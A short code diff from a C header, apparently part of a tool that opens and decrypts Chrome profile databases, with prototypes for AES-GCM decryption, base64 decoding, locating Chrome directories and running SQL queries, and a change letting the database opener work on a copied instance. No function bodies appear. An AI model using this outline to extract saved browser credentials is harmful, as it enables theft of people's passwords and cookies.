@@ -21,7 +21,7 @@ BOOL aesgcm_decrypt(BCRYPT_KEY_HANDLE handle_bcrypt, DWORD offset, BYTE* encrypt
 BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_string);
 BOOL checkSubtring(const CHAR* substring, PCHAR test_string);
 BOOL get_file_explorer(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, WORD buf_outSize);
-BOOL open_database(PSTR chrome_dir_char, PSTR profile_name, void** handle_db, PSTR buf_outMsg, WORD buf_outSize);
+BOOL open_database(PSTR database_location, void** handle_db, PSTR buf_outMsg, WORD buf_outSize, BOOL open_copied_instance);
 BOOL prepare_sql(void* handle_db, void** handle_sql_stmt, const char* sql_stmt, PSTR buf_outMsg, WORD buf_outSize);
 BOOL iterate_result(void* handle_sql_stmt);
 void* get_result(void* handle_sql_stmt, int index, int type);
